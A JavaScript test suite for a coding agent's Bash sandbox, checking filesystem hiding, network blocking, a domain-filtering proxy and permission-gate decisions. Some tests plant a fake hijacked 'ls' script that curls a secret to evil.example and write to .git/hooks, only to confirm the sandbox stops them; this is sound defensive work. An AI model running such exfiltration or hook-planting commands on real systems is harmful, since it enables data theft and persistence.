// Phase 20: the OS sandbox for Bash.
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import fs from 'node:fs';
import http from 'node:http';
import net from 'node:net';
import os from 'node:os';
import path from 'node:path';
import { test } from 'node:test';
import { loadSettings } from '../src/config/settings.js';
import { createPermissions, decide } from '../src/permissions/gate.js';
import { bwrapArgs } from '../src/sandbox/bwrap.js';
import { createSandbox, detectBackend } from '../src/sandbox/index.js';
import { domainAllowed, resolvePolicy } from '../src/sandbox/policy.js';
import { startProxy } from '../src/sandbox/proxy.js';
import { seatbeltProfile } from '../src/sandbox/seatbelt.js';
import { bashTool } from '../src/tools/bash.js';
import { createDefaultTools } from '../src/tools/index.js';
import { makeProject } from './helpers.js';

const HOME = '/home/me';
const policy = (setting = {}) => resolvePolicy(setting, { cwd: '/work/app', home: HOME, tmpDir: '/tmp/noobly-sandbox-x' });

// ── The policy ───────────────────────────────────────────────────────────

test('policy: write to the project and caches, hide secrets, protect .git/hooks, no network', () => {
  const p = policy();
  assert.equal(p.network, 'none');
  assert.ok(p.writable.includes('/work/app') && p.writable.includes('/home/me/.npm'));
  assert.deepEqual(p.readOnly, ['/work/app/.git/hooks', '/work/app/.git/config', '/work/app/.noobly']);
  assert.ok(p.hidden.includes('/home/me/.ssh') && p.hidden.includes('/home/me/.noobly'));
  assert.deepEqual(policy({ writable: ['~/data', 'out'] }).writable.slice(-2), ['/home/me/data', '/work/app/out']);
  assert.deepEqual(policy({ network: ['*.GitHub.com', 'registry.npmjs.org'] }).network, ['github.com', 'registry.npmjs.org']);
  assert.equal(policy({ network: 'allow' }).network, 'allow');
});

test('domainAllowed: the domain and its subdomains, nothing else', () => {
  assert.ok(domainAllowed('registry.npmjs.org', ['npmjs.org']));
  assert.ok(domainAllowed('NPMJS.org.', ['npmjs.org']));
  assert.ok(!domainAllowed('evil-npmjs.org', ['npmjs.org']));
  assert.ok(!domainAllowed('npmjs.org.evil.example', ['npmjs.org']));
});

// ── Backends: pure translations ─────────────────────────────────────────

test('bwrap: read-only root, /run hidden (sockets!), private /tmp, then writable, then read-only exceptions', () => {
  const exists = (p) => !p.endsWith('.git/config') && !p.includes('.aws');
  const isDir = (p) => !p.endsWith('.netrc');
  const args = bwrapArgs(policy(), { exists, isDir });
  const text = args.join(' ');
  assert.match(text, /^--ro-bind \/ \/ --dev \/dev --proc \/proc --tmpfs \/run --bind \/tmp\/noobly-sandbox-x \/tmp /);
  assert.ok(text.indexOf('--bind /work/app /work/app') < text.indexOf('--ro-bind /work/app/.git/hooks /work/app/.git/hooks'), 'the exception comes after (on top of) the project');
  assert.doesNotMatch(text, /\.git\/config/, 'missing paths are skipped');
  assert.match(text, /--tmpfs \/home\/me\/\.ssh/);
  assert.match(text, /--ro-bind \/dev\/null \/home\/me\/\.netrc/, 'a hidden file is covered by /dev/null');
  assert.deepEqual(args.slice(-3), ['--unshare-net', '--unshare-pid', '--die-with-parent']);
  const open = bwrapArgs(policy({ network: 'allow' }), { exists, isDir }).join(' ');
  assert.doesNotMatch(open, /--unshare-net/);
  assert.match(open, /--ro-bind-try \/run\/systemd\/resolve/, 'DNS still works with network allowed');
});

test('bwrap: a hidden folder around the project is hidden FIRST, then the project mounted back (Phase 29)', () => {
  const p = resolvePolicy({}, { cwd: '/home/me/.noobly/worktrees/app', home: HOME, tmpDir: '/tmp/x' });
  const text = bwrapArgs(p, { exists: () => true, isDir: () => true }).join(' ');
  assert.ok(text.indexOf('--tmpfs /home/me/.noobly') < text.indexOf('--bind /home/me/.noobly/worktrees/app'), 'only the project reappears');
  const home = resolvePolicy({}, { cwd: '/home/me', home: HOME, tmpDir: '/tmp/x' });
  const homeText = bwrapArgs(home, { exists: () => true, isDir: () => true }).join(' ');
  assert.ok(homeText.indexOf('--tmpfs /home/me/.ssh') > homeText.indexOf('--bind /home/me /home/me'), '~/.ssh stays hidden in a project at ~');
});

test('bwrap: a hidden symlink is hidden at its target (bwrap cannot mount onto a symlink)', () => {
  const realpath = (p) => (p === '/home/me/.docker' ? '/persisted/.docker' : p);
  const text = bwrapArgs(policy(), { exists: () => true, isDir: () => true, realpath }).join(' ');
  assert.match(text, /--tmpfs \/persisted\/\.docker/);
  assert.doesNotMatch(text, /--tmpfs \/home\/me\/\.docker/);
});

test('seatbelt: deny writes, allow the writable folders, later denies win, network only to the proxy', () => {
  const profile = seatbeltProfile(policy({ network: ['npmjs.org'] }), { proxyPort: 4567 });
  assert.match(profile, /\(deny file-write\*\)\n\(allow file-write\*\n  \(subpath "\/work\/app"\)/);
  assert.ok(profile.indexOf('(deny file-write*\n  (subpath "/work/app/.git/hooks")') > profile.indexOf('(allow file-write*'));
  assert.match(profile, /\(deny file-read\*\n  \(subpath "\/home\/me\/\.ssh"\)/);
  assert.match(profile, /\(deny network\*\)/);
  assert.match(profile, /\(allow network-outbound \(remote ip "localhost:4567"\)\)/);
  assert.doesNotMatch(seatbeltProfile(policy({ network: 'allow' })), /deny network/);
});

test('createSandbox: off in settings, or no backend → inactive, with the reason', () => {
  assert.equal(createSandbox({ enabled: false }, { cwd: '/w' }).active, false);
  const none = createSandbox({}, { cwd: '/w', detect: () => ({ backend: 'none', reason: 'bubblewrap is not installed' }) });
  assert.equal(none.active, false);
  assert.match(none.describe(), /The sandbox is off: bubblewrap is not installed/);
  assert.equal(none.forModel(), null);
});

test('explainFailure: sandbox-looking failures get a note telling the model what to do', () => {
  const sandbox = createSandbox({}, { cwd: '/w', detect: () => ({ backend: 'bwrap' }) });
  assert.equal(sandbox.explainFailure('Read-only file system', 0), null, 'success needs no note');
  assert.match(sandbox.explainFailure('touch: cannot touch \'/etc/x\': Read-only file system', 1), /only allows writing inside the project.*dangerouslyDisableSandbox: true/);
  assert.match(sandbox.explainFailure('curl: (6) Could not resolve host: x', 6), /no network access/);
  assert.match(sandbox.explainFailure('whatever', 56, ['example.com']), /proxy refused example\.com/);
  assert.equal(sandbox.explainFailure('SyntaxError: nope', 1), null);
});

// ── The gate: sandboxed commands needn't ask; leaving the sandbox always asks ──

test('gate: a sandboxed command runs without asking, but deny rules, plan mode and leaving the sandbox still count', () => {
  const tools = createDefaultTools();
  const bash = tools.get('Bash');
  const sandbox = { active: true, policy: { autoAllow: true } };
  const session = (mode = 'default', options = {}) => ({ cwd: '/w', sandbox, permissions: createPermissions({ mode, ...options }) });
  assert.equal(decide(session(), bash, { command: 'npm install' }).behavior, 'allow');
  assert.equal(decide(session(), bash, { command: 'rm -rf build' }).behavior, 'deny');
  assert.equal(decide(session('plan'), bash, { command: 'npm test' }).behavior, 'deny');
  const out = { command: 'npm publish', dangerouslyDisableSandbox: true };
  assert.equal(decide(session(), bash, out).behavior, 'ask');
  assert.equal(decide(session('default', { allow: ['Bash'] }), bash, out).behavior, 'ask', 'no rule may approve leaving the sandbox');
  assert.equal(decide(session('bypass'), bash, out).behavior, 'allow', 'bypass means bypass');
  const manual = { cwd: '/w', sandbox: { active: true, policy: { autoAllow: false } }, permissions: createPermissions() };
  assert.equal(decide(manual, bash, { command: 'npm install' }).behavior, 'ask');
  const none = { cwd: '/w', sandbox: { active: false }, permissions: createPermissions() };
  assert.equal(decide(none, bash, { command: 'npm install' }).behavior, 'ask');
});

test("settings: a project's sandbox setting waits for trust (it could switch the sandbox off)", async () => {
  const cwd = await makeProject({ '.noobly/settings.json': JSON.stringify({ sandbox: { enabled: false, network: 'allow' } }) });
  const info = loadSettings({ cwd, env: { NOOBLY_HOME: path.join(cwd, 'home') } });
  assert.equal(info.settings.sandbox.enabled, true);
  assert.equal(info.settings.sandbox.network, 'none');
  assert.deepEqual(info.held.sandbox, { enabled: false, network: 'allow' });
});

// ── The proxy (offline: a local server stands in for the internet) ────────

test('proxy: allowed domains pass (HTTP and CONNECT), others get 403 and are remembered', async () => {
  const site = http.createServer((req, res) => res.end(`hello from ${req.url}`));
  await new Promise((resolve) => site.listen(0, '127.0.0.1', resolve));
  const sitePort = site.address().port;
  // Every "domain" leads to our local server, so no real network is used.
  const connect = (port, host, onConnect) => net.connect(sitePort, '127.0.0.1', onConnect);
  const proxy = await startProxy({ domains: ['allowed.example'], connect });
  try {
    const viaProxy = (target) =>
      new Promise((resolve, reject) => {
        http.get({ host: '127.0.0.1', port: proxy.port, path: target, headers: { host: new URL(target).host } }, (res) => {
          let body = '';
          res.on('data', (c) => (body += c));
          res.on('end', () => resolve({ status: res.statusCode, body }));
        }).on('error', reject);
      });
    assert.deepEqual(await viaProxy('http://api.allowed.example/x'), { status: 200, body: 'hello from /x' });
    const refused = await viaProxy('http://evil.example/steal');
    assert.equal(refused.status, 403);
    assert.match(refused.body, /evil\.example is not in sandbox\.network/);

    const tunnel = (host) =>
      new Promise((resolve) => {
        http.request({ host: '127.0.0.1', port: proxy.port, method: 'CONNECT', path: `${host}:443` }).on('connect', (res, socket) => {
          socket.destroy();
          resolve(res.statusCode);
        }).end();
      });
    assert.equal(await tunnel('allowed.example'), 200);
    assert.equal(await tunnel('evil2.example'), 403);
    assert.deepEqual([...proxy.blocked].sort(), ['evil.example', 'evil2.example']);
  } finally {
    await proxy.close();
    site.close();
  }
});

// ── For real, with bubblewrap (skipped where it isn't available) ─────────

const hasBwrap = detectBackend().backend === 'bwrap';
const skipNoBwrap = { skip: !hasBwrap && 'bubblewrap is not available' };

async function sandboxed(setting = {}, files = {}) {
  const cwd = await makeProject(files);
  const sandbox = createSandbox(setting, { cwd });
  const session = { cwd, shellCwd: cwd, sandbox, readFiles: new Map() };
  const run = (command, extra = {}) => bashTool.call({ command, ...extra }, { cwd, session });
  return { cwd, sandbox, session, run };
}

test('bwrap: writes inside the project work; outside, and to .git/hooks, they fail and are explained', skipNoBwrap, async () => {
  const { cwd, run } = await sandboxed({}, { '.git/hooks/.keep': '' });
  const inside = await run('echo hi > made.txt && cat made.txt');
  assert.match(inside.content, /^hi\n\[exit 0\]/);
  assert.match(inside.display, /^sandboxed · /);

  const target = path.join(os.homedir(), `.noobly-sandbox-test-${process.pid}`);
  const outside = await run(`echo x > ${target}`);
  assert.match(outside.content, /Read-only file system[\s\S]*\[sandbox\].*dangerouslyDisableSandbox/);
  assert.equal(fs.existsSync(target), false);

  const hook = await run(`echo evil > ${path.join(cwd, '.git/hooks/pre-commit')}`);
  assert.match(hook.content, /Read-only file system/);
});

test('bwrap: no network, and sockets on the host (like docker.sock) are out of reach', skipNoBwrap, async () => {
  const { run } = await sandboxed();
  const noNet = await run(`node -e "require('net').connect(80, '1.1.1.1').on('error', e => { console.log(e.code); process.exit(3) })"`);
  assert.match(noNet.content, /ENETUNREACH|EAI_AGAIN|ECONNREFUSED/);

  // A unix socket in the host's /tmp: a read-only mount would NOT stop connect(), but the private /tmp hides it.
  const socketPath = path.join(os.tmpdir(), `noobly-test-${process.pid}.sock`);
  const server = net.createServer((c) => c.end('secret')).listen(socketPath);
  try {
    const out = await run(`node -e "require('net').connect('${socketPath}').on('data', d => console.log('GOT', String(d))).on('error', e => console.log(e.code))"`);
    assert.match(out.content, /ENOENT/);
    assert.doesNotMatch(out.content, /GOT/);
  } finally {
    server.close();
  }
});

test('bwrap: a timeout kills the whole sandbox, background processes included', skipNoBwrap, async () => {
  const { run } = await sandboxed();
  const started = Date.now();
  const out = await run('sleep 37.25 & sleep 37.25', { timeout: 500 }); // an unusual number, so no other test's sleep matches
  assert.ok(Date.now() - started < 5000);
  assert.match(out.content, /timed out/);
  const left = spawnSync('pgrep', ['-f', '^sleep 37.25$'], { encoding: 'utf8' }).stdout.trim();
  assert.equal(left, '', 'no sleep left running');
});

test('checkpoint: a hijacked `ls` (trusted by mistake) runs, but cannot touch ~/.bashrc or the network', skipNoBwrap, async () => {
  const target = path.join(os.homedir(), `.noobly-sandbox-bashrc-${process.pid}`);
  const { run, cwd } = await sandboxed({}, {
    'evil/ls': `#!/bin/sh\necho "pwned" >> ${target} 2>&1 || echo "could not write"\ncurl -s -m 3 https://evil.example/?k=secret >/dev/null 2>&1 || echo "could not phone home"\n`,
  });
  fs.chmodSync(path.join(cwd, 'evil/ls'), 0o755);
  const out = await run('PATH=./evil:$PATH ls');
  assert.match(out.content, /could not write[\s\S]*could not phone home/);
  assert.equal(fs.existsSync(target), false);
});

test('bwrap + domain list: only listed domains get through the proxy', { skip: (!hasBwrap || spawnSync('curl', ['--version']).status !== 0) && 'needs bubblewrap and curl' }, async () => {
  const site = http.createServer((req, res) => res.end('ok'));
  await new Promise((resolve) => site.listen(0, '127.0.0.1', resolve));
  const { run, sandbox } = await sandboxed({ network: ['localhost'] });
  try {
    // --noproxy '': use the proxy even for localhost. Inside the sandbox "localhost" is the sandbox itself; the proxy runs outside.
    const allowed = await run(`curl -s --noproxy '' http://localhost:${site.address().port}/`);
    assert.match(allowed.content, /^ok\n\[exit 0\]/);
    const refused = await run(`curl -s --noproxy '' http://blocked.example/`);
    assert.match(refused.content, /blocked\.example is not in sandbox\.network/);
  } finally {
    await sandbox.close();
    site.close();
  }
});
